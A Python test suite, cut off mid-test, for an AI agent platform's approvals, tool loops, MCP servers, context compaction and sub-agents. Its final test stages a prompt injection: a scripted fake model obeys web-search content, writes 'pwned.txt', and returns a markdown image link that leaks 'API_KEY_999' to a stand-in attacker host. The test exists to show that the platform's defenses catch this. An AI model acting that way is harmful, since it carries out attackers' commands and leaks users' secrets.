"""Phase 03 Acceptance Suite (Tests 1-8): agent loop, approvals, fenced repair, and MCP."""

from __future__ import annotations

import asyncio
import sys
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import httpx
import pytest
from backend.app.main import create_app
from backend.cli import cli_list_approvals
from backend.core.models import ApprovalRuleRecord
from backend.core.settings import Settings
from backend.core.uow import UnitOfWork
from backend.domain.tools.filesystem import get_user_workspace_root, workspace_write_file
from backend.providers.base import ProviderChatRequest
from backend.providers.fake import FakeProvider, FakeScript, FakeScriptStep
from sqlalchemy.ext.asyncio import AsyncSession


def _msg_text(m: Any) -> str:
    if hasattr(m, "content"):
        return str(m.content)
    if isinstance(m, dict):
        return str(m.get("content", ""))
    return str(m)


def _msg_role(m: Any) -> str:
    if hasattr(m, "role"):
        return str(m.role)
    if isinstance(m, dict):
        return str(m.get("role", ""))
    return ""


async def _login_admin(client: httpx.AsyncClient, app: Any) -> str:
    admin_pw = app.state.bootstrap_admin_result.temporary_password
    r_login = await client.post(
        "/api/auth/login",
        json={"username": "admin", "password": admin_pw},
    )
    assert r_login.status_code == 200
    csrf = str(r_login.json()["csrf_token"])
    await client.post(
        "/api/auth/password/change",
        json={"current_password": admin_pw, "new_password": "StrongAdminPassword!2026"},
        headers={"X-CSRF-Token": csrf},
    )
    return csrf


async def _wait_for_pending_approval(
    app: Any,
    user_id: str,
    run_id: str,
    max_wait_s: float = 5.0,
) -> dict[str, Any]:
    deadline = asyncio.get_running_loop().time() + max_wait_s
    while asyncio.get_running_loop().time() < deadline:
        pending = await app.state.run_manager.list_approvals(
            user_id=user_id,
            status="pending",
            run_id=run_id,
        )
        if pending:
            return dict(pending[0])
        await asyncio.gather(asyncio.to_thread(lambda: None))
    raise AssertionError(f"Run {run_id} did not emit a pending approval within {max_wait_s}s")


async def test_01_multi_step_agent_loop_with_approval_round_trip(tmp_path: Path) -> None:
    """Acceptance #1: Multi-step agent loop with auto read_file + ask shell approval round-trip."""
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't1.db'}",
        delta_coalesce_interval_ms=0,
    )

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        if call_idx == 0:
            return FakeScript(
                name="step1_read_and_shell",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_read_1",
                        tool_name="read_file",
                        args={"path": "config.txt"},
                    ),
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_shell_1",
                        tool_name="shell",
                        args={"command": "echo 'DEPLOY_OK_42'"},
                    ),
                    FakeScriptStep(kind="usage", input_tokens=40, output_tokens=25),
                ],
            )
        return FakeScript(
            name="step2_final_answer",
            model="fake/default",
            steps=[
                FakeScriptStep(
                    kind="text",
                    text="Both read_file and shell completed: DEPLOY_OK_42.",
                ),
                FakeScriptStep(kind="usage", input_tokens=80, output_tokens=20),
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50101))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_me = await client.get("/api/auth/me")
            user_id = str(r_me.json()["id"])

            # Seed workspace file for read_file
            ws_root = get_user_workspace_root(settings.data_dir, user_id)
            workspace_write_file(ws_root, "config.txt", "PORT=8080\nMODE=production\n")

            r_chat = await client.post(
                "/api/chats", json={"title": "Approval Round Trip"}, headers={"X-CSRF-Token": csrf}
            )
            chat_id = r_chat.json()["id"]

            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Read config.txt and run echo DEPLOY_OK_42."},
                headers={"X-CSRF-Token": csrf},
            )
            assert r_msg.status_code in (200, 201)
            run_id = r_msg.json()["run"]["id"]

            # Wait until shell requests approval
            pending = await _wait_for_pending_approval(app, user_id, run_id)
            approval_id = str(pending["id"])
            assert pending["tool_name"] == "shell"

            # Verify run status is waiting_approval while read_file already succeeded
            run_mid = await app.state.run_manager.get_run_dict(run_id, user_id=user_id)
            assert run_mid["status"] == "waiting_approval"
            mid_events = await app.state.run_manager.list_events(run_id, after_seq=0)
            read_finished = [
                e
                for e in mid_events
                if e.type == "tool.result" and e.data.get("call_id") == "c_read_1"
            ]
            assert len(read_finished) == 1
            assert read_finished[0].data["ok"] is True

            # Resolve approval via API (POST /api/approvals/{id}/resolve)
            r_res = await client.post(
                f"/api/approvals/{approval_id}/resolve",
                json={"decision": "approve", "scope": "once"},
                headers={"X-CSRF-Token": csrf},
            )
            assert r_res.status_code == 200
            assert r_res.json()["status"] == "approved"

            # Wait for run completion
            final_run = await app.state.run_manager.wait_for_run(run_id, max_wait_seconds=5.0)
            assert final_run["status"] == "succeeded"

            all_events = await app.state.run_manager.list_events(run_id, after_seq=0)
            ev_types = [e.type for e in all_events]
            assert "tool.approval.requested" in ev_types
            assert "tool.approval.resolved" in ev_types
            assert "tool.output.delta" in ev_types
            shell_finished = [
                e
                for e in all_events
                if e.type == "tool.result" and e.data.get("call_id") == "c_shell_1"
            ]
            assert len(shell_finished) == 1
            assert shell_finished[0].data["ok"] is True
            assert all_events[-1].type == "run.finished"
            assert all_events[-1].data["reason"] == "completed"


async def test_02_approval_rule_persistence_always_with_argv_pattern_and_cli(
    tmp_path: Path,
) -> None:
    """Acceptance #2: Approve shell with scope='always' and argv prefix ['git', 'status'].

    Second run calling 'git status' executes automatically without prompting.
    Third run calling 'git push' still prompts for approval.
    Also verifies CLI (`odysseus approvals`) and `/deny <id>` slash command.
    """
    db_url = f"sqlite+aiosqlite:///{tmp_path / 't2.db'}"
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=db_url,
        delta_coalesce_interval_ms=0,
    )

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        last_role = _msg_role(req.messages[-1])
        last_content = _msg_text(req.messages[-1])
        if last_role == "tool":
            return FakeScript(
                name="after_shell",
                model="fake/default",
                steps=[FakeScriptStep(kind="text", text="Shell finished.")],
            )
        if "git push" in last_content:
            return FakeScript(
                name="call_git_push",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="tool_call",
                        call_id=f"c_push_{call_idx}",
                        tool_name="shell",
                        args={"command": "git push origin main"},
                    )
                ],
            )
        if "/deny " in last_content:
            return FakeScript(
                name="ack_deny",
                model="fake/default",
                steps=[FakeScriptStep(kind="text", text="Denied via slash command.")],
            )
        return FakeScript(
            name="call_git_status",
            model="fake/default",
            steps=[
                FakeScriptStep(
                    kind="tool_call",
                    call_id=f"c_status_{call_idx}",
                    tool_name="shell",
                    args={"command": "git status --short"},
                )
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50102))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_me = await client.get("/api/auth/me")
            user_id = str(r_me.json()["id"])

            r_chat = await client.post(
                "/api/chats", json={"title": "Rule Persistence"}, headers={"X-CSRF-Token": csrf}
            )
            chat_id = r_chat.json()["id"]

            # Run 1: calls `git status --short` -> waits for approval -> approve with scope='always'
            r_m1 = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Run git status please"},
                headers={"X-CSRF-Token": csrf},
            )
            run1_id = r_m1.json()["run"]["id"]
            pending1 = await _wait_for_pending_approval(app, user_id, run1_id)

            r_res1 = await client.post(
                f"/api/approvals/{pending1['id']}/resolve",
                json={
                    "decision": "approve",
                    "scope": "always",
                    "pattern": '["git", "status"]',
                },
                headers={"X-CSRF-Token": csrf},
            )
            assert r_res1.status_code == 200
            fin1 = await app.state.run_manager.wait_for_run(run1_id, max_wait_seconds=5.0)
            assert fin1["status"] == "succeeded"

            # Run 2: calls `git status --short` -> executes WITHOUT approval prompt!
            r_m2 = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Run git status again"},
                headers={"X-CSRF-Token": csrf},
            )
            run2_id = r_m2.json()["run"]["id"]
            fin2 = await app.state.run_manager.wait_for_run(run2_id, max_wait_seconds=5.0)
            assert fin2["status"] == "succeeded"
            ev2 = await app.state.run_manager.list_events(run2_id, after_seq=0)
            assert not any(e.type == "tool.approval.requested" for e in ev2)
            assert any(e.type == "tool.result" for e in ev2)

            # Run 3: calls `git push origin main` -> STILL prompts for approval!
            r_m3 = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Now run git push origin main"},
                headers={"X-CSRF-Token": csrf},
            )
            run3_id = r_m3.json()["run"]["id"]
            pending3 = await _wait_for_pending_approval(app, user_id, run3_id)
            assert pending3["tool_name"] == "shell"

            # Verify CLI list and slash command `/deny <approval_id>`
            cli_items = await cli_list_approvals(settings, status="pending")
            assert any(item["id"] == pending3["id"] for item in cli_items)

            r_slash = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": f"/deny {pending3['id']}"},
                headers={"X-CSRF-Token": csrf},
            )
            assert r_slash.status_code in (200, 201)
            fin3 = await app.state.run_manager.wait_for_run(run3_id, max_wait_seconds=5.0)
            assert fin3["status"] == "succeeded"
            ev3 = await app.state.run_manager.list_events(run3_id, after_seq=0)
            assert any(e.type == "tool.denied" for e in ev3)
            # Wait for the slash command run itself to finish cleanly
            slash_run_id = r_slash.json()["run"]["id"]
            await app.state.run_manager.wait_for_run(slash_run_id, max_wait_seconds=5.0)


async def test_03_fenced_tool_call_fallback_and_single_repair(tmp_path: Path) -> None:
    """Acceptance #3: Fenced tool-call fallback + single repair prompt on malformed JSON."""
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't3.db'}",
        delta_coalesce_interval_ms=0,
    )

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        if call_idx == 0:
            # Step 1a: emit malformed fenced JSON
            return FakeScript(
                name="malformed_fenced",
                model="fake/fenced",
                steps=[
                    FakeScriptStep(
                        kind="text",
                        text=(
                            "Let me read the file:\n```tool_call\n"
                            '{"name": "read_file", "args": {"path": "broken_json"\n```\n'
                        ),
                    )
                ],
            )
        if call_idx == 1:
            # Step 1b (after repair prompt): emit valid fenced call
            return FakeScript(
                name="repaired_fenced",
                model="fake/fenced",
                steps=[
                    FakeScriptStep(
                        kind="text",
                        text=(
                            "```tool_call\n"
                            '{"name": "read_file", "args": {"path": "hello.txt"}}\n```'
                        ),
                    )
                ],
            )
        return FakeScript(
            name="final_after_fenced",
            model="fake/fenced",
            steps=[
                FakeScriptStep(
                    kind="text",
                    text="File content is FENCED_SUCCESS_99.",
                )
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50103))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_me = await client.get("/api/auth/me")
            user_id = str(r_me.json()["id"])

            ws_root = get_user_workspace_root(settings.data_dir, user_id)
            workspace_write_file(ws_root, "hello.txt", "FENCED_SUCCESS_99\n")

            r_chat = await client.post(
                "/api/chats",
                json={"title": "Fenced Repair", "model": "fake/fenced"},
                headers={"X-CSRF-Token": csrf},
            )
            chat_id = r_chat.json()["id"]

            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Read hello.txt using fenced tool calls.", "model": "fake/fenced"},
                headers={"X-CSRF-Token": csrf},
            )
            run_id = r_msg.json()["run"]["id"]
            fin = await app.state.run_manager.wait_for_run(run_id, max_wait_seconds=5.0)
            assert fin["status"] == "succeeded"

            # Verify repair prompt was issued in call_idx == 1
            assert len(fake.recorded_messages) == 3
            repair_turn_msgs = fake.recorded_messages[1]
            assert any("[Tool Call Parse Error]" in _msg_text(m) for m in repair_turn_msgs)

            events = await app.state.run_manager.list_events(run_id, after_seq=0)
            assert any(
                e.type == "notice" and e.data.get("code") == "tool_call_parse_repair"
                for e in events
            )
            assert any(e.type == "tool.result" and e.data.get("ok") is True for e in events)
            # And verify the model received FENCED_SUCCESS_99 in its 3rd call!
            third_turn_msgs = fake.recorded_messages[2]
            assert any("FENCED_SUCCESS_99" in _msg_text(m) for m in third_turn_msgs)


async def test_04_loop_detection_nudge_and_graceful_abort(tmp_path: Path) -> None:
    """Acceptance #4: Script FakeProvider to emit identical (tool, args) repeatedly.

    Assert loop detector injects a nudge after the 2nd identical call and aborts on the 3rd
    with a helpful final summary and `notice(code='loop_breaker_triggered')`.
    """
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't4.db'}",
        delta_coalesce_interval_ms=0,
        agent_max_identical_tool_calls=3,
    )

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        return FakeScript(
            name=f"repeat_call_{call_idx}",
            model="fake/default",
            steps=[
                FakeScriptStep(
                    kind="tool_call",
                    call_id=f"c_loop_{call_idx}",
                    tool_name="list_dir",
                    args={"path": "."},
                )
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50104))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_chat = await client.post(
                "/api/chats", json={"title": "Loop Detector"}, headers={"X-CSRF-Token": csrf}
            )
            chat_id = r_chat.json()["id"]

            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Keep listing the directory."},
                headers={"X-CSRF-Token": csrf},
            )
            run_id = r_msg.json()["run"]["id"]
            fin = await app.state.run_manager.wait_for_run(run_id, max_wait_seconds=5.0)
            assert fin["status"] == "succeeded"

            # Verify nudge was injected into model prompt before the final aborting call
            all_prompt_texts = [_msg_text(m) for turn in fake.recorded_messages for m in turn]
            assert any("[Loop Breaker Nudge]" in t for t in all_prompt_texts)

            events = await app.state.run_manager.list_events(run_id, after_seq=0)
            assert any(
                e.type == "notice" and e.data.get("code") == "loop_breaker_triggered"
                for e in events
            )
            detail = await app.state.chat_service.get_chat_detail(
                chat_id=chat_id,
                user_id=fin["user_id"],
            )
            asst_msgs = [m for m in detail["messages"] if m["role"] == "assistant"]
            assert any("I'm stuck" in m["content"] for m in asst_msgs)


async def test_05_bundled_mcp_server_end_to_end_and_health_restart(tmp_path: Path) -> None:
    """Acceptance #5: Register bundled filesystem MCP server, discover tools, and test restart."""
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't5.db'}",
        delta_coalesce_interval_ms=0,
    )
    mcp_root = tmp_path / "mcp_jail"
    mcp_root.mkdir(parents=True, exist_ok=True)
    (mcp_root / "secret_note.txt").write_text("MCP_BUNDLED_VALUE_777\n", encoding="utf-8")

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        if call_idx == 0:
            return FakeScript(
                name="mcp_step_1",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_mcp_list",
                        tool_name="mcp__fs__list_directory",
                        args={"path": "."},
                    ),
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_mcp_read",
                        tool_name="mcp__fs__read_text_file",
                        args={"path": "secret_note.txt"},
                    ),
                ],
            )
        return FakeScript(
            name="mcp_step_2",
            model="fake/default",
            steps=[
                FakeScriptStep(
                    kind="text",
                    text="Read from MCP server: MCP_BUNDLED_VALUE_777.",
                )
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50105))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)

            # Register bundled filesystem MCP server via API
            r_srv = await client.post(
                "/api/mcp/servers",
                json={
                    "name": "fs",
                    "transport": "stdio",
                    "command_or_url": sys.executable,
                    "args": ["-m", "backend.mcp.bundled.filesystem_server", str(mcp_root)],
                    "enabled": True,
                    "risk_overrides": {
                        "list_directory": "read",
                        "read_text_file": "read",
                    },
                },
                headers={"X-CSRF-Token": csrf},
            )
            assert r_srv.status_code in (200, 201), r_srv.text
            srv_data = r_srv.json()
            server_id = str(srv_data["id"])
            tool_names = [t["name"] for t in srv_data["discovered_tools"]]
            assert "list_directory" in tool_names, f"srv_data={srv_data}"
            assert "read_text_file" in tool_names

            # Run an agent turn that calls both MCP tools
            r_chat = await client.post(
                "/api/chats", json={"title": "MCP E2E"}, headers={"X-CSRF-Token": csrf}
            )
            chat_id = r_chat.json()["id"]
            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={
                    "content": (
                        "Use mcp__fs__list_directory and "
                        "mcp__fs__read_text_file on secret_note.txt."
                    )
                },
                headers={"X-CSRF-Token": csrf},
            )
            run_id = r_msg.json()["run"]["id"]
            fin = await app.state.run_manager.wait_for_run(run_id, max_wait_seconds=8.0)
            assert fin["status"] == "succeeded"

            events = await app.state.run_manager.list_events(run_id, after_seq=0)
            mcp_finished = [
                e
                for e in events
                if e.type == "tool.result" and e.data.get("call_id") == "c_mcp_read"
            ]
            assert len(mcp_finished) == 1
            assert mcp_finished[0].data["ok"] is True
            assert "MCP_BUNDLED_VALUE_777" in str(mcp_finished[0].data["summary"])

            # Kill the MCP server subprocess mid-idle and verify health check restarts it
            active = app.state.mcp_manager._active.get(server_id)
            assert active is not None and active.process is not None
            old_pid = active.process.pid
            active.process.kill()
            await active.process.wait()

            health_res = await app.state.mcp_manager.check_health_and_restart(server_id)
            assert health_res["healthy"] is True
            assert int(health_res["restart_count"]) >= 1
            new_active = app.state.mcp_manager._active.get(server_id)
            assert new_active is not None and new_active.process is not None
            assert new_active.process.pid != old_pid


async def test_06_skills_memory_and_compaction_in_4k_window(tmp_path: Path) -> None:
    """Acceptance #6: Seed 3 skills, 10 memory items, and a 25-turn chat history in a 4k window.

    Assert ContextBudgeter triggers `context.compacted`, selects only top-k tools, keeps skill index
    compact (progressive disclosure), and preserves all 3 needle facts within <= 4096 tokens.
    """
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't6.db'}",
        delta_coalesce_interval_ms=0,
    )

    fake = FakeProvider(
        FakeScript(
            name="small_4k_reply",
            model="fake/small-4k",
            steps=[FakeScriptStep(kind="text", text="Compacted 4k turn succeeded.")],
        )
    )
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50106))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_me = await client.get("/api/auth/me")
            user_id = str(r_me.json()["id"])

            # Seed 3 skills with large Markdown bodies (progressive disclosure: body NOT in index)
            for idx in range(1, 4):
                md_doc = (
                    f"---\n"
                    f"name: skill-guide-{idx}\n"
                    f"description: Specialized workflow guide #{idx}\n"
                    f"when_to_use: When handling workflow #{idx}\n"
                    f"---\n"
                    f"# Full Body {idx}\n" + ("Detailed step instructions. " * 120)
                )
                r_sk = await client.post(
                    "/api/skills",
                    json={
                        "markdown": md_doc,
                        "scope": "user",
                        "trusted": True,
                    },
                    headers={"X-CSRF-Token": csrf},
                )
                assert r_sk.status_code in (200, 201), r_sk.text

            # Seed 10 memory items
            for idx in range(1, 11):
                r_mem = await client.post(
                    "/api/memory",
                    json={
                        "text": (
                            f"User preference #{idx}: prefers concise Python 3.13 type annotations."
                        ),
                        "scope": "user",
                        "pinned": idx <= 2,
                    },
                    headers={"X-CSRF-Token": csrf},
                )
                assert r_mem.status_code in (200, 201), r_mem.text

            # Create chat with 4096-token model `fake/small-4k`
            r_chat = await client.post(
                "/api/chats",
                json={"title": "4k Compaction Test", "model": "fake/small-4k"},
                headers={"X-CSRF-Token": csrf},
            )
            chat_id = r_chat.json()["id"]

            # Seed 25 turns (50 messages) with 3 specific needle facts early in the conversation
            needles = {
                2: "NEEDLE_ALPHA=7391 is the production vault port.",
                5: "NEEDLE_BETA=velvet-comet is the staging cluster codename.",
                9: "NEEDLE_GAMMA=https://internal.odysseus.local/healthz is the status URL.",
            }
            filler = (
                "Discussion about system architecture, latency budgets, and storage layout. " * 8
            )
            for turn_i in range(1, 26):
                extra_fact = needles.get(turn_i, "")
                u_txt = f"Turn {turn_i} question: {extra_fact} {filler}"
                a_txt = f"Turn {turn_i} answer: Acknowledged {extra_fact}. {filler}"
                await app.state.chat_service.append_message(
                    chat_id=chat_id, user_id=user_id, role="user", content=u_txt
                )
                await app.state.chat_service.append_message(
                    chat_id=chat_id, user_id=user_id, role="assistant", content=a_txt
                )

            # Run turn 26
            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={
                    "content": "Search files and summarize our architecture and needle facts.",
                    "model": "fake/small-4k",
                },
                headers={"X-CSRF-Token": csrf},
            )
            assert r_msg.status_code in (200, 201)
            run_id = r_msg.json()["run"]["id"]
            fin = await app.state.run_manager.wait_for_run(run_id, max_wait_seconds=5.0)
            assert fin["status"] == "succeeded"

            # Assert context.compacted event was emitted
            events = await app.state.run_manager.list_events(run_id, after_seq=0)
            compacted_evs = [e for e in events if e.type == "context.compacted"]
            assert len(compacted_evs) == 1
            assert int(compacted_evs[0].data["removed_tokens"]) > 0

            # Assert ContextBudgeter breakdown fits in <= 4096 tokens and selected only top-k tools
            r_ctx = await client.get(f"/api/runs/{run_id}/context")
            assert r_ctx.status_code == 200
            ctx_data = r_ctx.json()["context"]
            assert int(ctx_data["total_tokens"]) <= 4096
            assert int(ctx_data["window_size"]) == 4096
            assert 1 <= len(ctx_data["selected_tools"]) <= 8

            sent_req = fake.recorded_requests[-1]

            # Assert progressive disclosure: skill index is present, full body is NOT
            combined_prompt = "\n".join(_msg_text(m) for m in sent_req.messages)
            assert "skill-guide-1" in combined_prompt
            assert "# Full Body 1" not in combined_prompt

            # Assert all 3 needle facts survived compaction!
            assert "NEEDLE_ALPHA=7391" in combined_prompt
            assert "NEEDLE_BETA=velvet-comet" in combined_prompt
            assert "NEEDLE_GAMMA=https://internal.odysseus.local/healthz" in combined_prompt


async def test_07_subagent_delegation_tool_restriction_and_depth_limit(tmp_path: Path) -> None:
    """Acceptance #7: Parent run calls spawn_agent(preset='researcher'); verify child & depth."""
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't7.db'}",
        delta_coalesce_interval_ms=0,
        agent_max_subagent_depth=2,
    )

    child_offered_tools: list[str] = []

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        last_role = _msg_role(req.messages[-1])
        last_msg = _msg_text(req.messages[-1])
        if last_role == "user" and "Find the code word in research_doc.txt" in last_msg:
            child_offered_tools.extend(t.name for t in req.tools)
            return FakeScript(
                name="child_step_1",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_child_read",
                        tool_name="read_file",
                        args={"path": "research_doc.txt"},
                    )
                ],
            )
        if last_role == "tool" and "SECRET=SUBAGENT_ORION_88" in last_msg:
            return FakeScript(
                name="child_step_2",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="text",
                        text="Child summary: The code word is SUBAGENT_ORION_88.",
                    )
                ],
            )
        if last_role == "tool" and "Child summary:" in last_msg:
            return FakeScript(
                name="parent_step_2",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="text",
                        text="Parent received child summary: SUBAGENT_ORION_88.",
                    )
                ],
            )
        return FakeScript(
            name="parent_step_1",
            model="fake/default",
            steps=[
                FakeScriptStep(
                    kind="tool_call",
                    call_id="c_parent_spawn",
                    tool_name="spawn_agent",
                    args={
                        "task": "Find the code word in research_doc.txt",
                        "preset": "researcher",
                        "budget": {"max_tokens": 2000, "max_tool_calls": 3},
                    },
                )
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50107))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_me = await client.get("/api/auth/me")
            user_id = str(r_me.json()["id"])

            ws_root = get_user_workspace_root(settings.data_dir, user_id)
            workspace_write_file(ws_root, "research_doc.txt", "SECRET=SUBAGENT_ORION_88\n")

            r_chat = await client.post(
                "/api/chats", json={"title": "Sub-agent Delegation"}, headers={"X-CSRF-Token": csrf}
            )
            chat_id = r_chat.json()["id"]

            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Delegate reading research_doc.txt to a researcher sub-agent."},
                headers={"X-CSRF-Token": csrf},
            )
            parent_run_id = r_msg.json()["run"]["id"]
            fin_parent = await app.state.run_manager.wait_for_run(
                parent_run_id, max_wait_seconds=8.0
            )
            assert fin_parent["status"] == "succeeded"

            parent_events = await app.state.run_manager.list_events(parent_run_id, after_seq=0)
            sub_started = [e for e in parent_events if e.type == "subagent.started"]
            sub_finished = [e for e in parent_events if e.type == "subagent.finished"]
            assert len(sub_started) == 1
            assert len(sub_finished) == 1
            child_run_id = str(sub_started[0].data["child_run_id"])
            assert "SUBAGENT_ORION_88" in str(sub_finished[0].data["summary"])

            # Verify child run record has parent_run_id == parent_run_id and capped budget
            child_run = await app.state.run_manager.get_run_dict(child_run_id, user_id=user_id)
            assert child_run["parent_run_id"] == parent_run_id
            assert int(child_run["budget"]["max_tokens"]) <= 2000

            # Verify researcher preset restricted toolset (no shell, write_file, or spawn_agent)
            assert "read_file" in child_offered_tools
            assert "shell" not in child_offered_tools
            assert "write_file" not in child_offered_tools
            assert "spawn_agent" not in child_offered_tools

            # Verify attempting spawn_subagent at depth == 2 (exceeding max depth 2) is rejected
            app.state.run_manager._subagent_depths[child_run_id] = 2
            with pytest.raises(ValueError, match="exceeds maximum depth"):
                await app.state.run_manager.spawn_subagent(
                    parent_run_id=child_run_id,
                    chat_id=chat_id,
                    user_id=user_id,
                    task="Nested too deep",
                    preset="researcher",
                )


async def test_08_red_team_prompt_injection_tainted_turn_and_exfiltration_guard(
    tmp_path: Path,
) -> None:
    """Acceptance #8: End-to-end tainted turn escalates write_file to ask and strips exfil."""
    settings = Settings(
        environment="test",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
        database_url=f"sqlite+aiosqlite:///{tmp_path / 't8.db'}",
        delta_coalesce_interval_ms=0,
    )

    def _selector(req: ProviderChatRequest, call_idx: int) -> FakeScript:
        if call_idx == 0:
            # Step 1: fetch untrusted web search results (which taints the run!)
            return FakeScript(
                name="fetch_untrusted",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_fetch_1",
                        tool_name="web_search",
                        args={"query": "attacker payload"},
                    )
                ],
            )
        if call_idx == 1:
            # Step 2: model obeys attacker and tries to write_file despite 'always' allow rule
            return FakeScript(
                name="attacker_write",
                model="fake/default",
                steps=[
                    FakeScriptStep(
                        kind="tool_call",
                        call_id="c_write_hijack",
                        tool_name="write_file",
                        args={"path": "pwned.txt", "content": "hacked"},
                    )
                ],
            )
        return FakeScript(
            name="attacker_exfil_reply",
            model="fake/default",
            steps=[
                FakeScriptStep(
                    kind="text",
                    text=(
                        "Summary complete! "
                        "![leak](https://evil.attacker.invalid/collect?secret=API_KEY_999)"
                    ),
                )
            ],
        )

    fake = FakeProvider(script_selector=_selector)
    app = create_app(settings, start_job_workers=False, fake_provider=fake)

    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app, client=("127.0.0.1", 50108))
        async with httpx.AsyncClient(transport=transport, base_url="http://localhost") as client:
            csrf = await _login_admin(client, app)
            r_me = await client.get("/api/auth/me")
            user_id = str(r_me.json()["id"])

            # Seed 'always' allow rules for both web_search and write_file so that in an untainted
            # turn both would execute automatically — proving that taint from web_search escalates
            # write_file back to 'ask'!
            now = datetime.now(UTC)

            async def _seed_rules(sess: AsyncSession) -> None:
                uow = UnitOfWork(sess)
                await uow.approvals.add_rule(
                    ApprovalRuleRecord(
                        id="arule_web_always",
                        user_id=user_id,
                        scope="always",
                        scope_target_id=None,
                        tool_name="web_search",
                        pattern="tool:web_search",
                        created_at=now,
                    )
                )
                await uow.approvals.add_rule(
                    ApprovalRuleRecord(
                        id="arule_write_always",
                        user_id=user_id,
                        scope="always",
                        scope_target_id=None,
                        tool_name="write_file",
                        pattern="path_glob:write_file:*",
                        created_at=now,
                    )
                )

            await app.state.db.execute_write(_seed_rules)

            r_chat = await client.post(
                "/api/chats", json={"title": "Injection Defense"}, headers={"X-CSRF-Token": csrf}
            )
            chat_id = r_chat.json()["id"]

            r_msg = await client.post(
                f"/api/chats/{chat_id}/messages",
                json={"content": "Search for attacker payload and summarize."},
                headers={"X-CSRF-Token": csrf},
            )
            run_id = r_msg.json()["run"]["id"]

            # web_search runs automatically, taints the turn, and escalates write_file to 'ask'
            pending = await _wait_for_pending_approval(app, user_id, run_id)
            assert pending["tool_name"] == "write_file"
            assert pending["tainted_source"] == "web"

            # Deny the hijacked write_file call
            await client.post(
                f"/api/approvals/{pending['id']}/resolve",
